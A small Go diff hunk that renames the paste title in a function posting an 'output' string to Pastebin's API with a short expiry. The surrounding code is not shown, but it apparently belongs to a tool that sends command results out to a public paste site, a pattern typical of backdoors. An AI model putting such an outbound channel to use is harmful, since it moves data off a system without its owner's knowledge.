@@ -74,7 +74,7 @@ func SendResponse(output string){
 	values.Set("api_dev_key", "")
 	values.Set("api_option", "paste")
 	values.Set("api_paste_code", output)
-	values.Set("api_paste_name", "U DONT KNO ME")
+	values.Set("api_paste_name", "TEST")
 	values.Set("api_paste_expire_date", "10M")
 	response, err := http.PostForm("http://pastebin.com/api/api_post.php", values)
 	defer response.Body.Close()
